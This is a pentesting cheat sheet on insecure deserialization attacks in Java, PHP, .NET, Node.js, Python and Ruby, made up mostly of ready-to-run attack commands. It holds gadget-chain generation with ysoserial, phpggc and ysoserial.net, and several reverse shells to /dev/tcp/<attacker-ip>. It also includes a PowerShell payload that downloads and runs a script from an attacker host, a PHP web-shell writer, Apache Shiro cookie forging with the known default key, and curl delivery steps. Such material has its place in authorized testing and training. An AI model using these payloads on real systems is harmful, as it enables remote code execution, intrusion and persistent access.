# Deserialization Attacks

#Deserialization #RCE #Java #PHP #DotNet #Python #Ruby #NodeJS #WebAppAttacks #ysoserial #phpggc #marshalsec #ViewState #GadgetChains

## What is this?

Insecure deserialization enables object injection, property manipulation, or RCE via gadget chains when untrusted data is deserialized without validation. Covers Java, PHP, Python, Ruby, and .NET. Pairs with [[Web Attacks]], [[Server-Side Attacks]], [[Non-PHP Web App Attacks]].

---

## Tools

| Tool | Language | Purpose |
|---|---|---|
| [[Tools/Payloads & Shells/ysoserial\|ysoserial]] | Java | Gadget chain payload generation |
| [[Tools/Payloads & Shells/phpggc\|phpggc]] | PHP | PHP gadget chain generation |
| [[Tools/Payloads & Shells/ysoserial.net\|ysoserial.net]] | .NET | .NET gadget chains + ViewState payloads |
| [[Tools/Payloads & Shells/marshalsec\|marshalsec]] | Java | Java unmarshalling exploit helper (Jackson, XStream, etc.) + JNDI/LDAP referral server |
| [[Tools/Payloads & Shells/SerializationDumper\|SerializationDumper]] | Java | Dump Java serialized objects in readable form |
| [[Tools/Web/Burpsuite\|Burp Suite]] | All | Deserialization Scanner / Freddy extensions (BApp Store) |
| `GadgetBuilder` | Java | Newer chain builder (2026) — merges ysoserial's 31 chains with ~29 others; revives chains on JDK 16+ (see note below) |

---

## Java Deserialization

Java's native serialization uses `ObjectInputStream.readObject()`. Deserializing a malicious object triggers gadget chains in classpath libraries.

### Identify

```bash
# Magic bytes: AC ED 00 05 (hex) / rO0AB (base64)
echo "rO0ABXNy..." | base64 -d | xxd | head
# 0000000: aced 0005 ...  ← Java serialized object

# Common locations:
# - Cookie: JSESSIONID (some frameworks), rememberMe (Apache Shiro)
# - HTTP headers: X-Auth-Token, X-Viewstate
# - POST body parameters (viewState, serializedData)
# - AMF (Adobe) streams, JMX RMI ports 1099/8686

# Shiro rememberMe cookie (uses Java serialization + AES)
# Look for: Set-Cookie: rememberMe=<base64>
curl -s -I "http://<target>/login" | grep -i "rememberme\|remember-me"
```

### ysoserial — Generate Gadget Chains

```bash
# Download — asset name is versioned per release; grab the "-all.jar" from the
# releases page (or build with `mvn clean package -DskipTests`). Example:
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar -O ysoserial-all.jar
# (check https://github.com/frohoff/ysoserial/releases for the current version)

# List available payloads (gadget chains)
java -jar ysoserial-all.jar 2>&1 | head -50
# Commons Collections 1-7, Spring, Groovy, Clojure, BeanShell, etc.

# Generate payload — CommonsCollections6 (most universal)
java -jar ysoserial-all.jar CommonsCollections6 'id' > payload.ser

# With command containing spaces (use bash -c)
java -jar ysoserial-all.jar CommonsCollections6 'bash -c {echo,<b64cmd>}|{base64,-d}|bash' > payload.ser

# Base64 encode the b64 command (reverse shell):
echo -n 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' | base64 -w 0
# → bash reverse shell encoded

# Full pipeline:
B64=$(echo -n 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' | base64 -w 0)
java -jar ysoserial-all.jar CommonsCollections6 "bash -c {echo,${B64}}|{base64,-d}|bash" > payload.ser

# Common chains to try in order:
# CommonsCollections6 → CC5 → CC1 → CC2 → CC3 → CC4 → Spring1 → Spring2 → Groovy1
```

> [!warning] **ysoserial has been unmaintained since 2021.** Many of its chains rely on reflection into `java.*` internals, which JDK 16+ blocks by default (JEP 396 strong encapsulation). A chain that "should" work can fail with `InaccessibleObjectException` on a modern target — that is a tooling failure, not proof the target is patched. Confirm the target's Java version before ruling a chain out.

```bash
# Running ysoserial itself on a modern JDK — reopen the packages it reflects into
java --add-opens java.base/java.util=ALL-UNNAMED \
     --add-opens java.base/java.lang=ALL-UNNAMED \
     --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
     --add-opens java.base/java.net=ALL-UNNAMED \
     --add-opens java.base/java.io=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections6 'id' > payload.ser

# Simplest workaround: generate payloads under JDK 8/11 even if the target runs 17+
# (the serialized bytes are what matter, not the generating JVM)
```

> [!tip] Where ysoserial's chain set comes up dry against a recent target, `GadgetBuilder` (2026) bundles a substantially larger chain corpus and restores ~17 ysoserial chains for Java 16+. Worth reaching for before concluding the sink isn't exploitable.

### Send Payload

```bash
# Send as raw POST body
nc -lvnp 4444 &
curl -s -X POST "http://<target>/deserialize" -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser

# Send in cookie (Apache Shiro rememberMe, etc.)
PAYLOAD=$(java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 -w 0)
curl -s "http://<target>/" -H "Cookie: rememberMe=$PAYLOAD"

# Send via Burp — paste base64 payload into cookie/param field

# JMX RMI attack via ysoserial
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit <target> 1099 CommonsCollections6 'id'

# JNDI (Log4Shell pattern — for apps with Log4j ≤2.14.1)
# See dedicated Log4Shell notes
```

### Apache Shiro

```bash
# Shiro 1.2.4 and earlier — hardcoded AES key (kPH+bIxk5D2deZiIxcaaaA==)
# Shiro 1.2.5+ — default key changed but still symmetric encryption

# ShiroExploit / shiro_attack tools
git clone https://github.com/SummerSec/ShiroAttack2
# Or use ysoserial with Shiro key:

python3 << 'EOF'
import base64, os
from Crypto.Cipher import AES
import subprocess

# Known default Shiro key (kPH+bIxk5D2deZiIxcaaaA==)
KEY = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

# Generate ysoserial payload first
payload = subprocess.check_output([
    "java", "-jar", "ysoserial-all.jar", "CommonsCollections6", "id"
])

# Encrypt with AES CBC (Shiro uses AES-CBC with random IV)
BS = AES.block_size
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
IV = os.urandom(BS)
encryptor = AES.new(KEY, AES.MODE_CBC, IV)
encrypted = encryptor.encrypt(pad(payload))
result = base64.b64encode(IV + encrypted).decode()
print(f"Cookie: rememberMe={result}")
EOF

# Detect Shiro by response header
curl -s -I "http://<target>/login" | grep -i "deleteMe\|rememberMe"
# Shiro responds with Set-Cookie: rememberMe=deleteMe on invalid cookie
```

### Automated Java Deser Scanning

```bash
# Burp Extensions: Java Deserialization Scanner (BApp Store)
# Sends common gadget chain payloads, checks for DNS/HTTP interactions

# Gadget Inspector — find gadget chains in custom JAR files
java -jar gadget-inspector.jar target-app.jar

# DeserLab — lab environment for testing
```

---

## PHP Deserialization

PHP `unserialize()` on untrusted data. Magic methods (`__wakeup`, `__destruct`, `__toString`) execute automatically on deserialization.

### Identify

```bash
# Look for serialized PHP objects in:
# - Cookies (base64 or raw)
# - Hidden form fields (viewstate, data)
# - GET/POST parameters

# PHP serialized format:
# O:8:"UserName":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
# O:<length>:"<classname>":<property_count>:{<properties>}

# Base64 of serialized object will decode to this format
echo "<cookie_value>" | base64 -d | head -c 100

# Detect: starts with O:, a:, s:, i:, b:, N;
```

### Object Injection

```bash
# If app deserializes and class has useful magic methods:

# Example vulnerable class:
# class Config {
#   public $template = "default";
#   public function __destruct() {
#     include($this->template);  # <-- LFI/RFI
#   }
# }

# Craft malicious serialized object:
python3 << 'EOF'
# PHP serialization format builder
classname = "Config"
props = {"template": "/etc/passwd"}  # or "http://attacker.com/shell.php"

def php_serialize_str(s):
    return f's:{len(s)}:"{s}";'

def php_serialize_obj(cls, properties):
    props_serial = ""
    for k, v in properties.items():
        props_serial += php_serialize_str(k) + php_serialize_str(v)
    return f'O:{len(cls)}:"{cls}":{len(properties)}:{{{props_serial}}}'

payload = php_serialize_obj(classname, props)
print(payload)
import base64
print(base64.b64encode(payload.encode()).decode())
EOF

# Send in cookie or parameter
curl -s "http://<target>/page" -b "data=$(python3 -c "import base64; print(base64.b64encode(b'O:6:\"Config\":1:{s:8:\"template\";s:11:\"/etc/passwd\";}').decode())")"
```

### phpggc — PHP Gadget Chains

```bash
# Install
git clone https://github.com/ambionics/phpggc
cd phpggc

# List available gadget chains
./phpggc -l
./phpggc -l | grep -i "laravel\|symfony\|yii\|magento\|wordpress"

# Generate payload — RCE via Laravel
./phpggc Laravel/RCE1 system 'id'
./phpggc Laravel/RCE5 system 'id' -b   # base64 encoded
./phpggc Laravel/RCE5 "bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'" -b

# Common frameworks and chains:
./phpggc Symfony/RCE1 system 'id' -b
./phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET["c"]);?>' -b
./phpggc Yii/RCE1 system 'id' -b
./phpggc WordPress/RCE1 system 'id' -b

# Send payload
PAYLOAD=$(./phpggc Laravel/RCE5 system 'id' -b)
curl -s "http://<target>/vulnerable" -d "data=$PAYLOAD"
```

---

## .NET Deserialization

.NET uses `BinaryFormatter`, `ObjectStateFormatter`, `LosFormatter`, `NetDataContractSerializer`, `JavaScriptSerializer`, `XmlSerializer`, and `Json.NET`. ViewState is a common vector.

### Identify

```bash
# ASP.NET ViewState — hidden form field
curl -s "http://<target>/page.aspx" | grep -i "viewstate\|__VIEWSTATE"
# Value is base64 — may be signed (MAC) or encrypted

# Decode ViewState (if unprotected)
echo "<viewstate_value>" | base64 -d | strings | head -20

# HTTP headers: X-Viewstate, X-EventTarget

# WCF / .NET Remoting — TCP 8686, named pipes
```

### ysoserial.net

```bash
# Download
wget https://github.com/pwntester/ysoserial.net/releases/latest/download/ysoserial.exe

# List gadget chains
mono ysoserial.exe -h
mono ysoserial.exe -l   # list all gadgets + formatters

# Generate payload for ViewState (BinaryFormatter)
mono ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(\"http://<attacker-ip>/shell.ps1\")'"

# ViewState specific (no MAC key — old IIS)
mono ysoserial.exe -g ActivitySurrogateSelector -f LosFormatter -c "cmd /c whoami > C:\inetpub\wwwroot\out.txt"

# With MAC key known
mono ysoserial.exe -g TextFormattingRunProperties -f ViewState --validationkey=<key> --validationalg=SHA1 -c "cmd /c whoami"

# Json.NET gadget (common in APIs)
mono ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami"

# Common .NET chains: TypeConfuseDelegate, ObjectDataProvider, ActivitySurrogateSelector
```

### ViewState Attack (IIS/ASP.NET)

```bash
# Check if ViewState MAC validation is disabled (older apps)
# Try modifying any byte in ViewState — if no "Validation of viewstate MAC failed" → MAC disabled

# If MAC disabled — generate payload directly
mono ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "cmd /c whoami > C:\inetpub\wwwroot\pwned.txt" -o base64

# Inject via __VIEWSTATE POST parameter
curl -s -X POST "http://<target>/page.aspx" -d "__VIEWSTATE=<b64_payload>&__VIEWSTATEGENERATOR=<value>&__EVENTTARGET=&__EVENTARGUMENT="

# ViewState MAC key hunting:
# web.config: <machineKey validationKey="..." decryptionKey="..."/>
# May be leaked via path traversal, XXE, SSRF
```

---

## Node.js / JavaScript Deserialization

Node.js `serialize-javascript` and similar libraries can execute embedded JS via `eval`.

```bash
# node-serialize package (CVE-2017-5941)
# Vulnerable to: {"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()"}

# Payload for node-serialize:
python3 -c "
import base64, json
payload = {
    'rce': '_\$\$ND_FUNC\$\$_function(){return require(\"child_process\").execSync(\"id\").toString()}()'
}
print(base64.b64encode(json.dumps(payload).encode()).decode())
"

# Reverse shell
python3 -c "
import base64, json
cmd = 'bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\"'
payload = {'rce': f'_\$\$ND_FUNC\$\$_function(){{return require(\"child_process\").execSync(\"{cmd}\").toString()}}()'}
print(base64.b64encode(json.dumps(payload).encode()).decode())
"
```

---

## Python Deserialization

### Pickle

`pickle.loads()` on untrusted data executes arbitrary code via `__reduce__`. Detection: base64 blob in cookie/POST parameter, error messages referencing `pickle`.

```python
# Generate RCE payload
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

```bash
# Send as cookie or POST parameter
curl http://target.com/ --cookie "data=<base64_payload>"
curl -X POST http://target.com/api -d "session=<base64_payload>"
```

> [!note] `subprocess` gives more control over args than `os.system` — use `(subprocess.check_output, (['bash', '-c', 'cmd'],))` if the payload needs to avoid shell escaping issues.

### YAML (PyYAML)

`yaml.load()` without `Loader=yaml.SafeLoader` executes `!!python/object/apply` constructors.

```bash
# RCE payload
!!python/object/apply:os.system ["id"]

# Subprocess (avoids shell quoting)
!!python/object/apply:subprocess.check_output [["id"]]
```

See [[Non-PHP Web App Attacks]] for full YAML deser coverage.

---

## Ruby Deserialization

### Marshal

`Marshal.load` on untrusted data executes gadget chains. Rails < 4.0 used Marshal by default for session cookies. Detection: binary blob in cookie that isn't JSON or base64-JWT.

```bash
# Check cookie type
echo "<cookie_value>" | base64 -d | file -
# "data" → potentially Marshal, not JSON

# Detect: \x04\x08 are the Marshal magic bytes (0x04 0x08)
echo "<cookie_value>" | base64 -d | xxd | head -1
```

> [!warning] `Marshal.dump(ERB.new(...))` then `Marshal.load` does NOT run the template — it only round-trips the ERB object. The code executes only if something later calls `.result` on it, which `Marshal.load` never does. RCE on `Marshal.load` alone requires a real **gadget chain** that ends in code execution during object reconstruction.

```ruby
# Use a published universal gadget chain — do NOT expect a bare Marshal.dump to RCE.
# elttam's universal RCE gadget works on stock Ruby (2.x–3.x, no extra gems):
#   https://github.com/GhostManager/... (search "elttam ruby universal gadget")
# The chain abuses Gem::Requirement / Gem::DependencyList etc. to reach a code sink.

# Skeleton (fill in from the published gadget for your Ruby version):
require 'base64'
payload = "<serialized gadget chain bytes>"    # generated by the universal-gadget script
puts Base64.strict_encode64(payload)
```

```bash
# Tools / references
# - elttam "Ruby 2.x/3.x universal deserialisation gadget" (Luke Jahnke) writeup + PoC
# - Vakzz / GadgetProbe style tooling for Ruby chains

# Modern Rails: don't craft Marshal payloads — if you leak SECRET_KEY_BASE, FORGE the
# signed/encrypted session cookie directly. Real tooling:
#   rails-session-decoder (Ruby)  — decode/encode Rails 4/5/6/7 cookies given the secret
#   or a rails console on the box: ActiveSupport::MessageEncryptor with the derived key
# https://github.com/Neohapsis/... (search "rails secret key base session")
```

> [!note] Modern Rails (4+) uses JSON-serialized, HMAC-signed cookies. Marshal deser is primarily a concern on legacy Rails 3.x or apps that explicitly use `Marshal.load`. If you have `SECRET_KEY_BASE`, forge the session directly rather than trying to craft Marshal payloads. See [[Non-PHP Web App Attacks]].

---

## Detection Tools

```bash
# Burp Extension: Java Deserialization Scanner
# Sends ysoserial payloads via Burp to all params, checks OAST callbacks

# Freddy (Burp Extension) — also covers .NET, PHP, Ruby, Python
# BApp Store → Freddy, Deserialization Bug Finder

# Nuclei — template paths shift between releases; search the installed set rather than
# hardcoding a path:
nuclei -u http://<target> -tags deserialization,java
nuclei -u http://<target> -t $(nuclei -tl 2>/dev/null | grep -i deserial | head -1)

# Check for common vulnerable libraries in response headers/errors
curl -s "http://<target>/" -I | grep -i "x-powered-by\|server"
curl -s "http://<target>/error" | grep -i "commons\|spring\|struts\|log4j\|shiro"
```

---

## Quick Reference

| Platform | Tool | Common Chains |
|----------|------|--------------|
| Java | ysoserial (JDK 8/11 to generate) | CC1-7, Spring1-2, Groovy1 |
| Java (JDK 16+ target) | GadgetBuilder, or ysoserial with `--add-opens` | Larger corpus; ysoserial chains often fail bare |
| Java (Shiro) | ysoserial + AES key | CommonsCollections |
| PHP | phpggc | Laravel/RCE1-9, Symfony/RCE1-4 |
| .NET | ysoserial.net | TypeConfuseDelegate, ObjectDataProvider |
| Node.js | manual | node-serialize IIFE |

```bash
# Magic bytes to spot Java deser
echo "<param>" | base64 -d | xxd | grep -c "aced 0005" && echo "Java serialized"

# Quick PHP unserialize check — look for O: in decoded params
echo "<cookie>" | base64 -d | grep "^O:"

# ysoserial quick test (ping OOB)
java -jar ysoserial-all.jar CommonsCollections6 'ping -c 1 <attacker-ip>' > ping.ser
curl -s -X POST "http://<target>/api" --data-binary @ping.ser
```

---

*Created: 2026-03-04*
*Updated: 2026-07-30*
*Model: claude-opus-5*